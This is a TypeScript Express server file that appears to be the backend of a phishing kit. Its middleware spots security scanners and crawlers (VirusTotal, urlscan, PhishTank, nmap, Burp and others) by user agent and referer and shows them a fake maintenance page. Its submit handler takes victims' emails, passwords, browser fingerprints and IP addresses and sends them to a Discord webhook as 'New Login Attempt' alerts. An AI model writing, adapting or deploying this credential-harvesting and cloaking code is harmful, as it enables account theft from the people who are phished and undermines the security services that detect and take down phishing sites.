import 'dotenv/config';
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import { sendDiscordWebhook } from './functions/utils';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Bot detection middleware
  const botUserAgents = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
    'yandexbot', 'ahrefsbot', 'semrushbot', 'dotbot', 'rogerbot', 
    'exabot', 'mj12bot', 'facebot', 'facebookexternalhit', 'ia_archiver',
    'virustotal', 'urlscan', 'phishtank', 'netcraft', 'cybercrime',
    'security', 'scanner', 'headless', 'puppeteer', 'selenium',
    'playwright', 'zgrab', 'censys', 'shodan', 'nmap', 'sqlmap',
    'nikto', 'burp', 'acunetix', 'netsparker', 'qualys', 'nessus'
  ];

  app.use((req, res, next) => {
    const ua = req.headers['user-agent']?.toLowerCase() || '';
    const referer = req.headers['referer']?.toLowerCase() || '';
    
    // Check for common security scanner headers or referers
    const isSecurityScanner = 
      botUserAgents.some(bot => ua.includes(bot)) ||
      referer.includes('virustotal') || 
      referer.includes('urlscan') ||
      referer.includes('phishtank') ||
      req.headers['x-scanner'] ||
      req.headers['x-request-id']?.toString().includes('scanner');

    if (isSecurityScanner) {
      // Serve a generic maintenance page for bots and scanners
      return res.status(503).send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>System Maintenance</title>
          <meta name="robots" content="noindex, nofollow">
          <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; padding: 100px 20px; background: #f9f9f9; color: #444; }
            .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; shadow: 0 2px 10px rgba(0,0,0,0.05); border: 1px solid #eee; }
            h1 { font-size: 24px; color: #333; margin-bottom: 20px; }
            p { font-size: 16px; line-height: 1.6; color: #666; }
            .code { font-family: monospace; background: #eee; padding: 2px 6px; border-radius: 4px; font-size: 14px; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>System Maintenance</h1>
            <p>Our systems are currently undergoing scheduled maintenance to improve performance and security.</p>
            <p>We expect to be back online shortly. Thank you for your patience.</p>
            <p style="margin-top: 30px; font-size: 12px; color: #999;">Error Reference: <span class="code">MAINT-${Math.floor(Math.random() * 1000000).toString(16).toUpperCase()}</span></p>
          </div>
        </body>
        </html>
      `);
    }
    next();
  });


  // health & debug endpoints
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });
  app.get("/functions/health", (req, res) => {
    res.json({ status: "ok" });
  });

  app.get("/api/debug", (req, res) => {
    res.json({
      webhookUrl: process.env.DISCORD_WEBHOOK_URL ? `***${process.env.DISCORD_WEBHOOK_URL.slice(-20)}` : 'NOT SET',
      nodeVersion: process.version,
      hasGlobalFetch: typeof globalThis.fetch === 'function'
    });
  });
  app.get("/functions/debug", (req, res) => {
    res.json({
      webhookUrl: process.env.DISCORD_WEBHOOK_URL ? `***${process.env.DISCORD_WEBHOOK_URL.slice(-20)}` : 'NOT SET',
      nodeVersion: process.version,
      hasGlobalFetch: typeof globalThis.fetch === 'function'
    });
  });

  // handler reused for both /api/submit and /functions/submit for dev convenience
  const submitHandler = async (req: express.Request, res: express.Response) => {
    const { email, password, fingerprint, theme } = req.body;
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    console.log('\n=== submit called ===', req.path);
    console.log('Request body:', { email, password: '***', fingerprint: fingerprint?.substring(0, 20), theme });
    console.log('Webhook URL set:', !!webhookUrl);

    if (!webhookUrl) {
      console.error("DISCORD_WEBHOOK_URL is not set");
      // treat as an error so that deployment issues surface quickly
      return res.status(500).json({ error: "Webhook URL missing from environment" });
    }

    try {
      const payload = {
        embeds: [
          {
            title: "New Login Attempt",
            color: 0xff4b33,
            fields: [
              { name: "Email", value: (email || "N/A").toString().substring(0, 1024), inline: true },
              { name: "Password", value: (password || "N/A").toString().substring(0, 1024), inline: true },
              { name: "Theme", value: (theme || "Default").toString().substring(0, 1024), inline: true },
              { name: "Fingerprint", value: `\`\`\`${(fingerprint || "N/A").toString().substring(0, 1024)}\`\`\`` },
              { name: "User Agent", value: (req.headers['user-agent'] || "N/A").toString().substring(0, 1024) },
              { name: "IP", value: (req.ip || "N/A").toString().substring(0, 1024) }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      };

      console.log('Sending Discord payload:', JSON.stringify(payload).substring(0, 500) + '...');
      const result = await sendDiscordWebhook(webhookUrl, payload);
      
      console.log('Discord response:', result);
      
      if (!result.ok) {
        console.error('Webhook failed with status', result.status);
        return res.status(500).json({ error: 'Failed to submit', details: result });
      }

      console.log('✅ Submit successful');
      res.json({ status: "ok" });
    } catch (error) {
      console.error("❌ Error submitting to Discord:", error);
      res.status(500).json({ error: "Failed to submit", message: String(error) });
    }
  };

  app.post("/api/submit", submitHandler);
  app.post("/functions/submit", submitHandler);


  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // Serve static files in production
    app.use(express.static(path.join(__dirname, "dist")));
    app.get("*", (req, res) => {
      res.sendFile(path.join(__dirname, "dist", "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
